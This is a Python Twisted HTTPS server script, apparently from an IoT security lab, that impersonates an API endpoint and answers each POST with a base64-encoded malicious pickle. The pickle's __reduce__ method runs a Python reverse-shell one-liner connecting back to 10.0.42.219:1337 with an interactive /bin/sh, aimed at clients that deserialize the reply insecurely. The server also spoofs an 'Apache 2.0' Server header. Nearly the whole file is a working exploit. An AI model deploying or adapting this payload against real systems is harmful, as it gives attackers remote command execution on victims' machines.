#!/usr/bin/env python
from twisted.web.server import Site
from twisted.web.resource import Resource
from twisted.internet import reactor, ssl
from twisted.internet.task import deferLater
from twisted.web.server import NOT_DONE_YET
import json
import sys
import base64
import pickle
from time import time, sleep
import logging
import os
from pprint import pprint


serverIp = "10.0.42.1"
serverPort = 65535
serverUrl = "json"
serverCert = '/home/iot/server.crt'
serverKey = '/home/iot/server.key'
logFile = "/home/iot/server.log"
reverseIp = "10.0.42.219"
reversePort = 1337

logging.basicConfig (filename=logFile, level=logging.DEBUG)




# Attacker prepares exploit that application will insecurely deserialize
class exploit (object):
	def __reduce__(self):
		return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (reverseIp, reversePort),))


# Handle client input
def handleInput (content):
	status = "OK"
	detail = ""
	data = {}

	try:
		# Recover the payload the payload sent by the client
		logging.info ("[*]\tClient connection received")
		exploit0 = exploit ()
		payload = pickle.dumps (exploit0)
		payloadB64 = base64.b64encode (payload)
		payloadJSON = {"method": "validate-reply", "payload": payloadB64}
		data = payloadJSON

	except Exception as e:
		status = "ERROR"
		detail = "Caugth an exception handling request payload: %s" % e
		logging.info ("[!]\t%s" % detail)

	return (status, detail, data)


# Parse and check the received JSON query
class jsonHandler (Resource):

	# Callback function for the render_POST defer, does the actual job
	def _delayedRender (self, request):

		try:
			jsonContent = json.loads (request.content.read ())
			status, detail, data = handleInput (jsonContent)

			res = data
			res.update ({"status": status, "detail": detail.encode ("utf8")})
			
			# Construct response and end it
			request.write (json.dumps (res, sort_keys=True, indent=4, separators=(',', ': ')))
			request.finish ()

		except Exception as e:
			pprint (e)
			# Construct response and end it
			request.write ('{\n\t"status": "ERROR",\n\t"detail": "Error while payload analysis"\n}')
			request.finish ()

		return ()


	# Errback function that cancel the connection
	def _responseFailed (self, err, call):
		call.cancel ()
		return ()


	# Handle POST requests
	def render_POST (self, request):
		# Set the response headers
		request.setHeader ("Server", "Apache 2.0")
		request.setHeader ("Content-Type", "application/json")
	
		# Setup the deter, its callback and its errorback
		call = reactor.callLater (2, self._delayedRender, request)
		request.notifyFinish ().addErrback (self._responseFailed, call)

		# Special return that says "wait for it budy"
		return (NOT_DONE_YET)


# HTTP listenner class
class listenner ():
	apiUrl = ""
	apiInterface = ""
	apiPort = ""


	# Init the listenner with the URL to use for the API
	def __init__ (self, url, apiInterface, apiPort):
		self.apiUrl = url
		self.apiInterface = apiInterface
		self.apiPort = apiPort


	def run (self):
		# Create the webserver root
		root = Resource ()

		# Create /json page and bind it to jsonHandler ressource
		root.putChild (self.apiUrl, jsonHandler ())

		# Create the factory
		factory = Site (root)
		reactor.listenSSL (self.apiPort, factory, ssl.DefaultOpenSSLContextFactory (serverKey, serverCert))

		# Launch the reactor (the main event loop)
		reactor.run ()



def main ():
	global dbCon, dbCur

	# Set the HTTP listenner to listen on http://127.0.0.1:65535/json
	try:
		logging.info ("[*]\tLaunching server")
		logging.info ("[*]\tLaunching HTTPs listenner")
		httpListenner = listenner (serverUrl, serverIp, serverPort)
		httpListenner.run ()

	except Exception as e:
		logging.warning ("[!]\tCaugth an unhandled exception: %s" % e)

	logging.info ("[*]\tStopping server")
	return (0)


if __name__ == "__main__":
	sys.exit (main ())
